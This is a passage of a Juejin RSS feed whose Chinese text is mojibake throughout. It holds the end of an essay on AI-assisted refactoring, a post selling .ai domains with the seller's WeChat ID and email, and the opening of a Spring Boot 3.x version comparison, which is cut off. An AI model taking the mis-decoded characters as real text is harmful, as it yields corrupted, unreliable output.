<li><strong>ç¬¬ä¸‰é˜¶æ®µï¼šå®æ–½ (Implementation)</strong> å½“æœ‰äº†ä¸€ä»½æ¸…æ™°ã€æ˜ç¡®ã€ç»è¿‡å®¡æŸ¥çš„è®¡åˆ’åï¼Œæœ€åä¸€æ­¥æ‰æ˜¯è®©AIæ¥æ‰§è¡Œã€‚ç”±äºæ‰€æœ‰çš„æ€è€ƒå’Œå†³ç­–éƒ½å·²å‰ç½®å®Œæˆï¼Œæˆ‘ä»¬å¯ä»¥å°†æ‰§è¡Œå·¥ä½œå§”æ‰˜ç»™ä¸€ä¸ª**â€œåå°ä»£ç†â€ï¼ˆbackground agentï¼‰**ã€‚å¼€å‘è€…å¯ä»¥å»å¤„ç†å…¶ä»–ä»»åŠ¡ï¼Œç¨åå†å›æ¥è¯„å®¡ç»“æœã€‚è¯„å®¡è¿‡ç¨‹ä¹Ÿå˜å¾—é£å¿«ï¼Œå› ä¸ºä½ åªéœ€éªŒè¯ä»£ç æ˜¯å¦ç¬¦åˆè®¡åˆ’ï¼Œè€Œæ— éœ€ä»å¤´ç†è§£ä»»ä½•æ–°åˆ›é€ çš„é€»è¾‘ã€‚</li>
</ul>
<p>è¿™ä¸€æ–¹æ³•æœ‰ä¸€ä¸ªè‡³å…³é‡è¦çš„å‰æï¼š<strong>ä½ å¿…é¡»é¦–å…ˆé€šè¿‡æ‰‹åŠ¨å®è·µæ¥èµ¢å¾—ç†è§£ï¼ˆearn the understandingï¼‰</strong>ã€‚å°±åƒNetflixçš„æˆæƒç³»ç»Ÿé‡æ„ä¸€æ ·ï¼Œå›¢é˜Ÿå¿…é¡»å…ˆæ‰‹åŠ¨å®Œæˆä¸€ä¸ªæ¨¡å—çš„è¿ç§»ï¼Œæ‰èƒ½çœŸæ­£æ‘¸æ¸…æ‰€æœ‰éšè—çš„çº¦æŸå’Œä¾èµ–ï¼Œå¹¶ä¸ºAIæä¾›ä¸€ä¸ªå¹²å‡€çš„ã€å¯ä¾›å­¦ä¹ çš„èŒƒä¾‹ã€‚è¿™æ˜¯æœ‰æ•ˆåˆ©ç”¨AIè¿›è¡Œé‡æ„çš„å…¥åœºåˆ¸ï¼Œæ²¡æœ‰æ·å¾„å¯èµ°ã€‚</p>
<hr/>
<h2 data-id="heading-4">5. æœ€åçš„æ€è€ƒï¼šæˆ‘ä»¬ä¸ºä½•è€Œå†™ä»£ç ï¼Ÿ</h2>
<p>AIæ”¹å˜äº†æˆ‘ä»¬ç¼–å†™ä»£ç çš„_æ–¹å¼_ï¼Œä½†å®ƒæ²¡æœ‰æ”¹å˜è½¯ä»¶å·¥ç¨‹å¤±è´¥çš„_åŸå› _ã€‚æ¯ä¸€ä»£å·¥ç¨‹å¸ˆéƒ½é¢ä¸´ç€è‡ªå·±çš„â€œè½¯ä»¶å±æœºâ€ï¼Œè€Œæˆ‘ä»¬çš„è§£å†³æ–¹æ¡ˆï¼Œä¸åº”æ˜¯å¦ä¸€ä¸ªæ›´å¼ºå¤§çš„å·¥å…·ï¼Œè€Œæ˜¯å›å½’åˆ°è½¯ä»¶å·¥ç¨‹æœ€æ ¸å¿ƒçš„è®¤çŸ¥ã€‚</p>
<p>æˆ‘ä»¬å¿…é¡»è®°ä½ä¸€ä¸ªæ°¸æ’çš„çœŸç†ï¼š<strong>è½¯ä»¶æ˜¯ä¸€é¡¹äººç±»äº‹ä¸š</strong>ã€‚æ­£å¦‚æ¼”è®²ä¸­æ‰€è¯´ï¼šâ€œè½¯ä»¶å¼€å‘æœ€éš¾çš„éƒ¨åˆ†ï¼Œä»æ¥ä¸æ˜¯æ•²ä»£ç ï¼Œè€Œæ˜¯çŸ¥é“è¯¥æ•²ä»€ä¹ˆä»£ç ã€‚â€</p>
<p>åœ¨è¿™åœºå˜é©ä¸­ï¼Œæœ€ç»ˆèƒ½å¤Ÿè„±é¢–è€Œå‡ºçš„å¼€å‘è€…ï¼Œä¸ä¼šæ˜¯é‚£äº›ç”Ÿæˆä»£ç æœ€å¤šçš„äººï¼Œè€Œæ˜¯é‚£äº›çœŸæ­£ç†è§£è‡ªå·±æ­£åœ¨æ„å»ºä»€ä¹ˆçš„äººã€‚</p>
<p>Jake Nationsæœ€åç•™ç»™æˆ‘ä»¬çš„ï¼Œæ˜¯ä¸€ä¸ªå€¼å¾—æ‰€æœ‰äººæ·±æ€çš„é—®é¢˜ï¼š</p>
<p>é—®é¢˜ä¸åœ¨äºæˆ‘ä»¬æ˜¯å¦ä¼šä½¿ç”¨AIâ€¦â€¦é—®é¢˜åœ¨äºï¼Œå½“AIç¼–å†™æˆ‘ä»¬å¤§éƒ¨åˆ†ä»£ç æ—¶ï¼Œæˆ‘ä»¬æ˜¯å¦è¿˜èƒ½ç†è§£æˆ‘ä»¬è‡ªå·±çš„ç³»ç»Ÿã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€æ‰¹ä¼˜è´¨ AI åŸŸåè½¬è®©ï¼ˆ.aiï¼‰ï½œé€‚åˆ AI åˆ›ä¸š / äº§å“ / å…¬å¸å“ç‰Œ]]></title>    <link>https://juejin.cn/post/7592815497847914559</link>    <guid>https://juejin.cn/post/7592815497847914559</guid>    <pubDate>2026-01-08T11:32:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592815497847914559" data-draft-id="7592856733182509092" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" ä¸€æ‰¹ä¼˜è´¨ AI åŸŸåè½¬è®©ï¼ˆ.aiï¼‰ï½œé€‚åˆ AI åˆ›ä¸š / äº§å“ / å…¬å¸å“ç‰Œ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T11:32:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ•°æ“AI"/> <meta itemprop="url" content="https://juejin.cn/user/2928754707402423"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             ä¸€æ‰¹ä¼˜è´¨ AI åŸŸåè½¬è®©ï¼ˆ.aiï¼‰ï½œé€‚åˆ AI åˆ›ä¸š / äº§å“ / å…¬å¸å“ç‰Œ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2928754707402423/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ•°æ“AI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T11:32:38.000Z" title="Thu Jan 08 2026 11:32:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>è¯´æ˜</strong>ï¼šä»¥ä¸‹åŸŸåå‡ä¸ºæœ¬äººè‡ªæŒï¼Œå› ç²¾åŠ›èšç„¦æ ¸å¿ƒé¡¹ç›®ï¼Œç°è½¬è®©éƒ¨åˆ†ä¼˜è´¨ AI åŸŸåã€‚<br/>
<strong>å®˜ç½‘åœ°å€</strong>ï¼š<code>https://shuqin.cc</code> or <code>https://shuqing.ai</code>ã€‚<br/>
**å¾®ä¿¡ï¼šfangcunai / é‚®ç®±ï¼š<a href="https://link.juejin.cn?target=mailto%3A15992478448%40163.com" target="_blank" title="mailto:15992478448@163.com" ref="nofollow noopener noreferrer">15992478448@163.com</a></p>
</blockquote>
<h2 data-id="heading-0">ä¸ºä»€ä¹ˆé€‰æ‹© <code>.ai</code> åŸŸåï¼Ÿ</h2>
<ul>
<li>
<p><code>.ai</code> å·²æˆä¸º <strong>äººå·¥æ™ºèƒ½é¢†åŸŸäº‹å®æ ‡å‡†åç¼€</strong></p>
</li>
<li>
<p>å›½é™…åŒ–ç¨‹åº¦é«˜ï¼Œé€‚åˆå‡ºæµ·ä¸å“ç‰Œå‡çº§</p>
</li>
<li>
<p>éå¸¸é€‚åˆä»¥ä¸‹åœºæ™¯ï¼š</p>
<ul>
<li>AI å·¥å…· / AI å¹³å°</li>
<li>ä¼ä¸šæœåŠ¡ï¼ˆToBï¼‰</li>
<li>å†…å®¹ç”Ÿæˆ / å¤šæ¨¡æ€</li>
<li>æ™ºèƒ½ç³»ç»Ÿ / æ•°æ®å¹³å°</li>
</ul>
</li>
</ul>
<h2 data-id="heading-1">ğŸ”¥ æ ¸å¿ƒæ¨èï¼ˆä¼˜å…ˆè½¬è®©ï¼‰</h2>
<h3 data-id="heading-2"><strong>fengkong.ai</strong></h3>
<p><strong>å…³é”®è¯ï¼šé£æ§ / é‡‘è AI / ä¼ä¸šçº§ç³»ç»Ÿ</strong></p>
<ul>
<li>â€œé£æ§â€æ˜¯é‡‘èã€æ”¯ä»˜ã€ä¿¡è´·çš„åˆšéœ€è¯</li>
<li>é€‚åˆï¼šåæ¬ºè¯ˆã€æ™ºèƒ½é£æ§ã€AI å†³ç­–å¹³å°</li>
<li>ToB å±æ€§æå¼ºï¼Œå•†ä¸šå˜ç°è·¯å¾„æ¸…æ™°</li>
</ul>
<p>ğŸ‘‰ <strong>é‡‘èç§‘æŠ€ / AI SaaS å›¢é˜Ÿä¼˜å…ˆæ¨è</strong></p>
<h3 data-id="heading-3"><strong>intv.ai</strong></h3>
<p><strong>å…³é”®è¯ï¼šå“ç‰Œç¼©å†™ / å›½é™…åŒ– / æ™ºèƒ½ TV / Interview</strong></p>
<ul>
<li>4 å­—æ¯çŸ­åŸŸåï¼Œæå¼ºå“ç‰Œæ„Ÿ</li>
<li>å¯æ‰©å±•å«ä¹‰ï¼šIntelligent TV / Interview / International Vision</li>
<li>éå¸¸é€‚åˆå›½é™…åŒ– AI äº§å“</li>
</ul>
<p>ğŸ‘‰ <strong>å“ç‰Œå‹é¡¹ç›®ä¼˜å…ˆ</strong></p>
<h3 data-id="heading-4"><strong>shuying.ai</strong></h3>
<p><strong>å…³é”®è¯ï¼šæ•°å½± / ä¹¦å½± / AI å†…å®¹ / å½±åƒç”Ÿæˆ</strong></p>
<ul>
<li>é€‚åˆ AI è§†é¢‘ã€å›¾åƒã€å†…å®¹ç”Ÿæˆæ–¹å‘</li>
<li>ä¸­æ–‡è¯­ä¹‰å‹å¥½ï¼Œæ˜“ä¼ æ’­</li>
<li>å“ç‰Œæƒ³è±¡ç©ºé—´å¤§</li>
</ul>
<h3 data-id="heading-5"><strong>yuanxu.ai</strong></h3>
<p><strong>å…³é”®è¯ï¼šæºåº / å…ƒåº / AI åº•å±‚ç³»ç»Ÿ</strong></p>
<ul>
<li>ååº•å±‚ã€ç³»ç»Ÿçº§å“ç‰Œ</li>
<li>é€‚åˆæ¨¡å‹å¹³å°ã€Agent æ¡†æ¶ã€åŸºç¡€è®¾æ–½ç±»é¡¹ç›®</li>
<li>æ°”è´¨åâ€œæŠ€æœ¯æ´¾â€</li>
</ul>
<h3 data-id="heading-6"><strong>qianyuan.ai</strong></h3>
<p><strong>å…³é”®è¯ï¼šå‰æ²¿ / ä¹¾å…ƒ / AI å‰æ²¿æŠ€æœ¯</strong></p>
<ul>
<li>é€‚åˆç ”ç©¶å‹å›¢é˜Ÿã€æŠ€æœ¯å“ç‰Œ</li>
<li>æœ‰â€œå‰æ²¿ç§‘æŠ€â€è¯­ä¹‰åŠ æˆ</li>
<li>é€‚åˆä¸­é•¿æœŸå“ç‰Œå»ºè®¾</li>
</ul>
<hr/>
<h2 data-id="heading-7">ğŸ§© åœºæ™¯å‹ä¼˜è´¨åŸŸåï¼ˆé€‚åˆå‚ç›´æ–¹å‘ï¼‰</h2>
<ul>
<li><strong>xietong.ai</strong> â€”â€” ååŒåŠå…¬ / ååŒæ™ºèƒ½</li>
<li><strong>fangcun.ai</strong> â€”â€” AI å·¥å…· / æ•ˆç‡äº§å“</li>
<li><strong>yuyuan.ai</strong> â€”â€” è¯­æº / å¤šæ¨¡æ€ / è¯­è¨€æ¨¡å‹</li>
<li><strong>furong.ai</strong> â€”â€” å†…å®¹ / åŸå¸‚ / æ–‡åŒ–ç±» AI</li>
<li><strong>shuqing.ai</strong> â€”â€” æƒ…æ„Ÿ / å†…å®¹ç”Ÿæˆ / IP å‹é¡¹ç›®</li>
<li><strong>shugu.ai</strong> â€”â€” æ•™è‚² / æ•°æ® / çŸ¥è¯†å¹³å°</li>
<li><strong>kangle.ai</strong> â€”â€” å¥åº· / åŒ»ç–— AI</li>
</ul>
<h2 data-id="heading-8">âš ï¸ è¯´æ˜ä¸å…±è¯†</h2>
<ul>
<li>æ‰€æœ‰åŸŸå <strong>å¯æ­£å¸¸è¿‡æˆ·</strong></li>
<li>ä»·æ ¼æŒ‰å¸‚åœºç†æ€§æˆäº¤ï¼Œä¸åšè™šé«˜</li>
<li>ä¼˜å…ˆè½¬è®©ç»™ <strong>çœŸå®ä½¿ç”¨çš„ç»ˆç«¯é¡¹ç›®</strong></li>
<li>ä¸æ¥å—ä½ä»·å€’å–</li>
</ul>
<h2 data-id="heading-9">ğŸ“® è”ç³»æ–¹å¼</h2>
<p>å¦‚ä½ å¯¹å…¶ä¸­æŸä¸ªåŸŸåæ„Ÿå…´è¶£ï¼Œå¯ç›´æ¥è”ç³»æˆ‘ï¼š</p>
<ul>
<li><strong>å¾®ä¿¡fangcunai / é‚®ç®±<a href="https://link.juejin.cn?target=mailto%3A15992478448%40163.com" target="_blank" title="mailto:15992478448@163.com" ref="nofollow noopener noreferrer">15992478448@163.com</a>/ ç«™å†…ç§ä¿¡:<a href="https://link.juejin.cn?target=https%3A%2F%2Fshuqin.cc" target="_blank" title="https://shuqin.cc" ref="nofollow noopener noreferrer">shuqin.cc</a></strong></li>
<li>è¯´æ˜ä½ å…³æ³¨çš„åŸŸå + é¡¹ç›®ç”¨é€”ï¼Œæ²Ÿé€šä¼šæ›´é«˜æ•ˆ</li>
</ul>
<blockquote>
<p>åŸŸåçš„ä»·å€¼ä¸åœ¨â€œå›¤â€ï¼Œè€Œåœ¨â€œè¢«çœŸæ­£ä½¿ç”¨â€ã€‚<br/>
å¸Œæœ›è¿™äº›åŸŸåèƒ½è¿›å…¥çœŸæ­£éœ€è¦å®ƒä»¬çš„é¡¹ç›®ä¸­ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Boot 3.3.xã€3.4.xã€3.5.x æ·±åº¦å¯¹æ¯”ä¸æ¼”è¿›åˆ†æ]]></title>    <link>https://juejin.cn/post/7592787377656594466</link>    <guid>https://juejin.cn/post/7592787377656594466</guid>    <pubDate>2026-01-08T11:44:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592787377656594466" data-draft-id="7592787377656578082" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" Spring Boot 3.3.xã€3.4.xã€3.5.x æ·±åº¦å¯¹æ¯”ä¸æ¼”è¿›åˆ†æ "/> <meta itemprop="keywords" content="åç«¯,Java,æ¶æ„"/> <meta itemprop="datePublished" content="2026-01-08T11:44:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é¢œæ·¡æ…•æ½‡"/> <meta itemprop="url" content="https://juejin.cn/user/4494459266678318"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             Spring Boot 3.3.xã€3.4.xã€3.5.x æ·±åº¦å¯¹æ¯”ä¸æ¼”è¿›åˆ†æ 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4494459266678318/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é¢œæ·¡æ…•æ½‡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T11:44:08.000Z" title="Thu Jan 08 2026 11:44:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2f7266619af4852a44ad1c11b9a0a38~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768477448&amp;x-signature=tHAeSpNshyahxzb0TolUqVeseIE%3D" alt="002.png" loading="lazy"/>
æœ¬æ–‡ä» <strong>â€œæ¶æ„å¸ˆ / æŠ€æœ¯è´Ÿè´£äººè§†è§’â€çš„è§’åº¦</strong>ã€‚è¿›ä¸€æ­¥ <strong>æ‹‰å¼€å±‚æ¬¡ã€æ‹‰æ·±åˆ†ææ·±åº¦</strong>ï¼Œä¸åªæ˜¯â€œç‰ˆæœ¬æœ‰ä»€ä¹ˆâ€ï¼Œè€Œæ˜¯å›ç­”ï¼š</p>
<blockquote>
<p><strong>ä¸ºä»€ä¹ˆè¦å‡ï¼Ÿä»€ä¹ˆæ—¶å€™å‡ï¼Ÿå‡åˆ°å“ªä¸€æ¡çº¿é£é™©æœ€ä½ï¼Ÿä¸åŒç±»å‹ç³»ç»Ÿæ€ä¹ˆé€‰ï¼Ÿ</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-0">ä¸€ã€èƒŒæ™¯ï¼šSpring Boot 3.x å·²è¿›å…¥â€œæˆç†ŸæœŸâ€</h2>
<p>ä» 2023 å¹´ Spring Boot 3.0 æ­£å¼è½åœ° Jakarta EE 9+ å¼€å§‹ï¼Œ3.x ç³»åˆ—æœ¬è´¨ä¸Šç»å†äº†ä¸‰ä¸ªé˜¶æ®µï¼š</p>
<ol>
<li>
<p><strong>3.0â€“3.2ï¼šå¹³å°è¿ç§»æœŸ</strong></p>
<ul>
<li>Java EE â†’ Jakarta EE</li>
<li>Spring Framework 6</li>
